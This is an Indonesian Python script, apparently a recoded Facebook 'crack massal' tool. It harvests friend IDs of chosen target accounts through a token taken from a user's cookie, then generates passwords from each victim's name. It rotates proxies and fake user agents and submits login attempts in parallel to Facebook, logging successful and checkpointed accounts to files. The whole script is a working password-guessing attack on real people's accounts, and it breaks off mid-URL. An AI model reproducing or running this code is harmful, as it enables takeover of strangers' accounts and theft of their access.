#ASTAGFIRULLAH JEBOL
import requests,json,os,sys,random,datetime,time,re,platform
#import ua_generator
from time import sleep as waktu
import requests,bs4,json,os,sys,random,datetime,time,re,urllib3,rich,base64
from time import sleep
from rich import pretty
from rich.tree import Tree
from rich.panel import Panel
from rich import print as cetak
from rich import print as rprint
from rich import print as prints
from rich.progress import track
from rich.text import Text as tekz
from rich.console import Console
from rich.columns import Columns
from rich.panel import Panel as nel
from rich.panel import Panel as panel
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as par
from rich.console import Group as gp
from bs4 import BeautifulSoup as parser
from rich.columns import Columns as col
from rich.console import Console as sol
from rich.markdown import Markdown as mark
#from pwinput import pwinput
from concurrent.futures import ThreadPoolExecutor as tred
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn,TimeRemainingColumn,TransferSpeedColumn
from time import time as waktunya
from rich.table import Table
from rich.live import Live
#from tk import Tk

###----------[ GLOBAL NAMA ]----------###
id,id2,uid = [],[],[]
tokenefb = []
akunyeh = []
ugen= []
loop,bra = 0,[]
ok,cp,oo = 0,0,[]
usragent = []
tokenku = []
###----------[ GET PROXY ]----------###
try:
	proxylist= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('socksku.txt','w').write(proxylist)
except Exception as e:
	bra_anim(f'gagal ster :(')
proxsi=open('socksku.txt','r').read().splitlines()
uak=[]
usman = random.choice(['Mozilla/5.0 (Linux; Android 8.1.0; OPPO CPH1803 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.96 Mobile Safari/537.36 AlohaBrowser/2.22.0','Mozilla/5.0 (Linux; Android 12; CPH2119) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13; CPH2455 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.75 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]','Mozilla/5.0 (Linux; Android 9; PAHM00) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-M215G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 11; SC51Aa) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A307G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; AQM-LX1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 11; Redmi Note 9S) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A326B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android; 8; en-us; Redmi 5 Plus Build/OPM1.171019.019N542I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.4335.107 UCBrowser/13.4.0.1306 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 11; Lenovo A7700 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4227.114 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 11; XIAOMI Mi Note 10 ProA839T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.4512.138 Mobile Safari/537.36 AlohaBrowser/2.15.0']) 
###----------[ USER AGENT ]----------###
for xd in range(10000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['3.0','4.4.2','4.4.4','5.0.1','8.0','7.0','6.0','5.0','4.0','4.3.4','7.0.1','8.0.1','3','4','5','6','7','8','9','10','11','12','13'])
    c=random.choice(['SAMSUNG SM-T530','SAMSUNG SM-T805','SAMSUNG-SM-G530AZ','SAMSUNG SM-G925K','SAMSUNG SM-G925L','SAMSUNG SM-G925T','SAMSUNG-SM-T337A','SAMSUNG SM-J110F','SAMSUNG-SM-G890A','SAMSUNG SM-T355Y','SAMSUNG SM-T817T','SAMSUNG SM-G925F','SAMSUNG SM-G928F','SAMSUNG SM-W2021'])
    d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    kk=random.randrange(83,103)
    buil=random.choice(['Build/JZO54K)','Build/LMY47V)','Build/LMY48B)','Build/LRX22C)','Build/LRX21V) ','Build/LRX22G)','Build/LRX21T)'])
    e=random.choice(['SamsungBrowser/3.0','SamsungBrowser/3.1','SamsungBrowser/3.2','SamsungBrowser/3.3','SamsungBrowser/3.4','SamsungBrowser/3.5','SamsungBrowser/3.6','SamsungBrowser/3.7','SamsungBrowser/3.8','SamsungBrowser/3.9','SamsungBrowser/4.0','SamsungBrowser/2.0','SamsungBrowser/2.1','SamsungBrowser/2.2','SamsungBrowser/2.3','SamsungBrowser/2.4','SamsungBrowser/2.5','SamsungBrowser/2.6','SamsungBrowser/2.7','SamsungBrowser/2.8','SamsungBrowser/2.9','SamsungBrowser/1.0','SamsungBrowser/1.1','SamsungBrowser/1','SamsungBrowser/5.0','SamsungBrowser/5.1','SamsungBrowser/5.2','SamsungBrowser/5.3','SamsungBrowser/5.4','SamsungBrowser/5.5','SamsungBrowser/5.6','SamsungBrowser/5.7','SamsungBrowser/5.8','SamsungBrowser/5.9','SamsungBrowser/6.0','SamsungBrowser/6.1','SamsungBrowser/19.0','SamsungBrowser/20.0','SamsungBrowser/21.0','SamsungBrowser/18.0','SamsungBrowser/17.0','SamsungBrowser/16.0','SamsungBrowser/15.0'])
    g=random.randrange(4200,4900)
    h=random.randrange(40,150)
    i='Mobile Safari/537.36'
    uaku=f'{a} {b}; {c} {buil} {d}{kk}.{g}.{h} {e} {i}'
    ugen.append(uaku)
###----------[ PEWARNA ]----------###
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
mer = '\033[1;31m'
kun = '\033[1;33m'
hijo = '\033[1;32m'
biru = '\033[1;34m'
ung = '\033[1;35m'
puti = '\033[1;37m'
bira = '\033[1;36m'
xxx = '\33[m'

M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH

M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
H3 = "[#FF00C0]" #ungu
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH
U2 = "[#AF00FF]" # UNGU
O2 = "[#FF8F00]" # ORANGE
domris = random.choice(['[bold white]','[bold green]','[bold purple]','[bold red]','[bold yellow]','[bold hot_pink2]','[bold blue]']) 
###----------[ CONVERT BULAN ]----------###
rb = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
tg = datetime.datetime.now().day
bl = rb[(str(datetime.datetime.now().month))]
th = datetime.datetime.now().year
okh = 'OK-'+str(tg)+'-'+str(bl)+'-'+str(th)+'.txt'
cph = 'CP-'+str(tg)+'-'+str(bl)+'-'+str(th)+'.txt'
wa = Console()
#running text##
os.system('clear') 
def running_text(s) :
	for c in s + '\n':
		sys.stdout.write(c) 
		sys.stdout.flush() 
		time.sleep(random.random() * 0.2) 

###----------[ UNTUK ANIMASI ]----------###
def bra_anim(berjalan):
        for gas in berjalan + "\n":sys.stdout.write(gas);sys.stdout.flush();time.sleep(0.05)
def bra_bann(berjalan):
        for gas in berjalan + "\n":sys.stdout.write(gas);sys.stdout.flush();time.sleep(0.01)
        
###----------[ BANNER MENUH ]----------###
def banner() :
    wa.print(f''' \t\t\t[italic red] ____  ____  __  __  ____  ____  __    ___  ____ 
\t\t\t [italic red](  _ \(  _ \(  )(  )(_  _)( ___)/__\  / __)( ___)
\t\t\t[italic yellow2] ) _ < )   / )(__)(   )(   )__)/(__)\( (__  )__) 
\t\t\t[italic yellow2](____/(_)\_)(______) (__) (__)(__)(__)\___)(____)
   	\t\t\t[bold red]•[bold yellow2]• [white dim]TOOLS CRACK MASSAL [bold red]•[bold yellow2]•\n''') 
#login#
def login():

	try:

		token = open('.token.txt','r').read()

		cok = open('.cok.txt','r').read()

		tokenefb.append(token)

		try:

			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenefb[0], cookies={'cookie':cok})

			sy2 = json.loads(sy.text)['name']

			sy3 = json.loads(sy.text)['id']

			menu(sy2,sy3)

		except KeyError:

			login_lagi334()

		except requests.exceptions.ConnectionError:

			li = ' ╰─  Problem Internet Connection, Check And Try Again'

			lo = mark(li, style='red')

			sol().print(lo, style='cyan')

			exit()

	except IOError:

		login_lagi334()

		

def login_lagi334():

	try:
		os.system('clear') 
#	        os.system('clear')
#	   	 
#                print(f'{P}JANGAN GUNAKAN AKUN PRIBADI') 
		banner()
		print(f'{m}\t\tPERHATIAN!!\n\r{k}JANGAN GUNAKAN AKUN PRIBADI') 
		your_cookies = input('[•] Masukan Cookie : ')

		with requests.Session() as r:

			try:

				r.headers.update({'content-type': 'application/x-www-form-urlencoded',})

				data = {'access_token': '867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01','scope': ''}

				response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)

				code, user_code = response['code'], response['user_code']

				verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01&callback=LeetsharesCallback'.format(code))

				r.headers.pop('content-type')

				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})

				response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text

				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):

					print(" ╰─  Cookie Invalid...", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()

				else:

					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')

					fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)

					jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)

					data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'qr': 0,'user_code': user_code,}

					r.headers.update({'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})

					response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})

					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):

						r.headers.pop('content-type');r.headers.pop('origin')

						response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text

						action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')

						fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)

						jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)

						scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)

						display = re.search('name="display" value="(.*?)"', str(response4)).group(1)

						user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)

						logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)

						auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)

						encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)

						return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)

						r.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})

						data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'scope': scope,'display': display,'user_code': user_code,'logger_id': logger_id,'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,'return_format[]': return_format,}

						response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies}).text

						windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')

						r.headers.pop('content-type');r.headers.pop('origin')

						r.headers.update({'referer': 'https://m.facebook.com/',})

						response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).text

						if 'Sukses!' in str(response6):

							r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})

							response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text

							access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)

							print(f"\n {k}╰─  Token : {access_token}")

							tokenew = open(".token.txt","w").write(access_token)

							cook= open(".cok.txt","w").write(your_cookies)

							print("\n ╰─  Login Berhasil | Jalankan ulang Script nya");exit()

			except Exception as e:

				print(" ╰─  Cookies Mokad bang")

				os.system('rm -rf .token.txt && rm -rf .cok.txt')

				print(e)

				time.sleep(3)

				back()

	except:pass
	

###----------[ BAGIAN MENU ]----------###
def menu(my_name,my_id) :
	try:
		cok = open('.cok.txt','r').read()
	except IOError:
		bra_anim(f'{mer}cookies telah kadaluarsa ster')
		waktu(4)
		login_lagi334() 
	os.system('clear')
	banner()
	wa.print(f'[italic red]•[italic yellow2]• [dim white]Your ID : [italic green]{my_id}\t\t\t[italic red]•[italic yellow2]• [dim white]Thanks To : [italic green]Author Yang Saya Tidak Tau Namanya') 
	wa.print(f'[italic red]•[italic yellow2]• [dim white]Your Name : [italic green]{my_name}\t\t\t[italic red]•[italic yellow2]• [dim white]Recode By : [italic green]RAF_MKZ') 
	print(' ') 
	wa.print(f'[italic red]•[italic yellow2]• [dim white]1. Krek Massal') 
	wa.print(f'[italic red]•[italic yellow2]• [dim white]2. Krek File') 
	raf_mkz = input(f'{m}•{k}• Pilih : {h} ') 
	if raf_mkz in ['1']:
	    nge_crack() 
	elif raf_mkz in ['2']:
	    crack_file()
	else:
	    print(f'{m}[X] PILIH YANG BENAR') 
	    time.sleep(1) 
	    exit() 
def crack_file():
	try:vin = os.listdir('/sdcard/RAF_MKZ')
	except FileNotFoundError:
		print('>> File Tidak Ditemukan ')
		time.sleep(2)
		back()
	if len(vin)==0:
		print('')
		raf = f'[white][[cyan]•[white]] Jika Ingin Menggunakan Fitur Ini Ikuti Syaratnya Dibawah Ini\n[[green]1[white]] Buatlah File Dump Id Terlebih dahulu\n[[green]2[white]] Setelah Jadi Masukkan Filenya Kedalam Folder[yellow] RAF_MKZ[white] di Penyimpanan Internal Kalian\n[[green]3[white]] Lalu Jalankan Ulang Scriptnya! Baru Pilih Fitur Nomor[yellow] 4 [white]ini '
		cetak(raf) 
		kontol = input('\n>> Apakah Anda Faham ( Y/t ) ')
		if kontol in ['']:
			print('>> Pilih Yang Bener Asuhh ')
		elif kontol in ['y','Y']:
			print(f'\n[{h}√{x}] Alhamdulillah Anda Sungguh Pintarr ')
			time.sleep(3)
			login() 
		elif kontol in ['t','T']:
			print(f'\n[{k}x{x}] Anda Sungguh Tolol ')
			time.sleep(3)
			login() 
		print('>> Anda Tidak Memiliki File Dump ')
		time.sleep(2)
		login() 
	else:
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('/sdcard/RAF_MKZ/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = ''+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print(f'{h}[{P}>{h}] {x} %s. %s ({h} %s{x} idz )'%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				print('>> %s. %s ({h} %s {x}idz) '%(cih,isi,len(hem)))
		geeh = input('\n>> Pilih : ')
		try:geh = lol[geeh]
		except KeyError:
			print(f'{k}>> Pilih Yang Bener Kontol {x}')
			time.sleep(3)
			login() 
		try:lin = open('/sdcard/RAF_MKZ/'+geh,'r').read().splitlines()
		except:
			print('>> File Tidak Ditemukan, Coba Lagi Nanti ')
			time.sleep(2)
			login() 
		for xid in lin:
			id.append(xid)
		atur_dulu()
	
###----------[ DUMP ID PUBLIK ]----------###

def nge_crack():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		wa = Console() 
		wa.print(f'\t\t\t[bold white]| [bold yellow]•[bold green]• [white][dim]Sc Ini Hanya Support Crack Massal [bold yellow]•[bold green2]•[bold white] |') 
		print (' ') 
	except IOError:
		exit()
	try:
	    
	    jum=int(input(f'{m}•{k}• {P}Mau Berapa Target? = {h}')) 
	except ValueError:
		print('{biru}━─═ ◕➤ Wrong input ')
		exit()
	if jum<1 or jum>80:
		print(f'{h}{biru}━─═ ◕➤ Pertemanan Tidak Publik  ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(f'{m}•{k}• {P}Masukkan id Target Yang Ke '+str(yz) + f': {h} ') 
		uid.append(kl)
		#print(su) 
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5002=)&access_token='+tokenefb[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:iso = (mi['username']+'|'+mi['name'])
				except:iso = (mi['id']+'|'+mi['name']) 
					if iso in id:pass
					else:id.append(iso) 
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('{biru}━─═ ◕➤ Unstable Signal ')
			exit()
	try:
		#mengetik('> > > > > > > > > > > > > > >] 100%') 
	    print('\r sedang dump %s id'%(len(id)),end=" ")
	    sys.stdout.flush()
	    time.sleep(0.0002) 
	    atur_dulu() 
	except:
	    print('teman tidak publik') 
	    exit()
###----------[  ATUR DULU STER ]----------###
def atur_dulu():
	for ngentod in id :
		xc = random.randint(0,len(id2)) 
		cammo = id2.insert(xc,ngentod) 
	kontius() 
	
def kontius():
	bra.append('free') 
	passwrd() 
from datetime import datetime
###----------[  BAGIAN WORDLIST ]----------###
def passwrd():
	#os.system('clear') 
	#banner() 
	global prog,des
	print(' ') 
	#prii = tekz(f'[white][•] OK SV IN :[green] /sdcard/OK/{okh}\n [white][•] CP SV IN : [yellow]/sdcard/CP/{cph}',justify='center') 
	wa.print(f'[bold red]•[bold yellow2]• [dim white]Hasil OK di Simpan Di [italic green]/sdcard/OK/{okh}')
	wa.print(f'[bold red]•[bold yellow2]• [dim white]Hasil Cp di Simpan Di [italic yellow]/sdcard/CP/{cph}') 
	print(' ') 
	prog = Progress(SpinnerColumn("runner"),TextColumn('{task.description}'),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task(' ',total=len(id))
	with prog:
		with tred(max_workers=30) as gas_krek:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			#	prr = random.randrange(1, 100) 
				frs = nmf.split(' ')[0]
				pwv = []
				pwt = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						#pwv.append(frs+str(prr)) 
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'321')
				#		pwv.append('muhammad'+frs) 
						#pwv.append(frs+'1')
						#pwv.append(frs+'2')
						#pwv.append(frs+'3')
						pwv.append(frs+'01')
						pwv.append(frs+'02')
						pwv.append(frs+'03')
						pwv.append(frs+'04')
						pwv.append(frs+'05')
						pwv.append(frs+'06')
						pwv.append(frs+'07')
						pwv.append(frs+'08')
						pwv.append(frs+'09')
						pwv.append(frs+'12')
						pwv.append(frs+'1') 
						pwv.append(frs+'2') 
						pwv.append(frs+'3') 
					#	pwv.append('mamasa') 
				#		pwv.append(frs+'pendek') 
				#		pwv.append('daeng'+frs) 
						pwv.append(frs+'cantik') 
						pwv.append(frs+'sayang') 
				#		pwv.append(frs+'pesek') 
				if 'ya' in pwt:
					for xpwn in pwn:
						pwv.append(xpwn)
				else:pass
				if 'free' in bra:
					gas_krek.submit(crackfree,idf,pwv) 
				
				else:
					gas_krek.submit(crackfree,idf,pwv) 
		rafly = f'[italic red]•[italic yellow]• [italic white]Crack[italic red] {len(id)}[italic white] Idz Telah Selesai, Hasil [italic green]OK = {ok} [italic white]Dan Hasil [italic yellow2]CP = {cp}[italic red] •[italic yellow]•'
		cetak(rafly) 
def cektahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011'
		elif fx[:6] in ['100004']          :tahunz = '2012'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2016'
		elif fx[:5] in ['10002']           :tahunz = '2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006']           :tahunz = '2021'
		elif fx[:5] in ['10009']           :tahunz = '2023'
		elif fx[:5] in ['10007','10008']:tahunz = '2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008'
	elif len(fx)==8:
		tahunz = '2007'
	elif len(fx)==7:
		tahunz = '2006'
	else:tahunz=''
	return tahunz
	###----------[  ASYNC ]----------###
oks=[]
cps=[]
def crackfree(idf,pwv):
	global loop,ok,cp
	#ahir = str(datetime.now()-awal).split('.')[0]
	bo = random.choice([m,k,h,b,u,x])
	usus = random.choice(ugen) 
	urgas = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36'
	ses = requests.Session()
	prog.update(des,description=f'\r[dim white]⏰{idf}⏰[italic white] [{loop}-{len(id)}]OK-:[italic green]{ok}[/] CP-:[italic yellow]{cp}[/]') 
	prog.advance(des) 
	for pw in pwv:
		try:
			link = ses.get('https://free.facebook.com/login.php?skip_api_login=1&api_key=546387748750105&kid_directed_site=0&app_id=546387748750105&signed_next=1&next=https%3A%2F%2Ffree.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fapp_id%3D546387748750105%26auth_type%3Drerequest%26cbt%3D1688382770423%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1829a399f40574%2526domain%253Dbrainly.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fbrainly.co.id%25252Ffdcfdd82afbb14%2526relation%253Dopener%26client_id%3D546387748750105%26display%3Dtouch%26domain%3Dbrainly.co.id%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fbrainly.co.id%252Fsignup%253Fentry%253D1%2526source%253Dunlogged%252Bhomepage%252Bheader%252Bbutton%26locale%3Den_US%26logger_id%3Df284b987fabd2fc%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df206a023ebbf0d%2526domain%253Dbrainly.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fbrainly.co.id%25252Ffdcfdd82afbb14%2526relation%253Dopener%2526frame%253Dfe20773f2a208%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26scope%3Dpublic_profile%252C%2Bemail%26sdk%3Djoey%26version%3Dv3.2%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df206a023ebbf0d%26domain%3Dbrainly.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fbrainly.co.id%252Ffdcfdd82afbb14%26relation%3Dopener%26frame%3Dfe20773f2a208%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'free.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','facebook-api-version': 'v3.2','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-debug': 'PIA4aDcy5ZePN17uU6TS3UdRGHP6qgnFu+b8an/Qh4/PT4ZTI1F7Ds45tKQBbP+K5lAq8TOVf5L+k0xOCdTGTg==','content-length': '0','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="98", "Not=A?Brand";v="99"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://free.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': urgas,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-user': '?1','sec-fetch-dest': 'empty','referer': 'https://free.facebook.com/login.php?skip_api_login=1&api_key=546387748750105&kid_directed_site=0&app_id=546387748750105&signed_next=1&next=https%3A%2F%2Ffree.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fapp_id%3D546387748750105%26auth_type%3Drerequest%26cbt%3D1688382770423%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1829a399f40574%2526domain%253Dbrainly.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fbrainly.co.id%25252Ffdcfdd82afbb14%2526relation%253Dopener%26client_id%3D546387748750105%26display%3Dtouch%26domain%3Dbrainly.co.id%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fbrainly.co.id%252Fsignup%253Fentry%253D1%2526source%253Dunlogged%252Bhomepage%252Bheader%252Bbutton%26locale%3Den_US%26logger_id%3Df284b987fabd2fc%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df206a023ebbf0d%2526domain%253Dbrainly.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fbrainly.co.id%25252Ffdcfdd82afbb14%2526relation%253Dopener%2526frame%253Dfe20773f2a208%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26scope%3Dpublic_profile%252C%2Bemail%26sdk%3Djoey%26version%3Dv3.2%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df206a023ebbf0d%26domain%3Dbra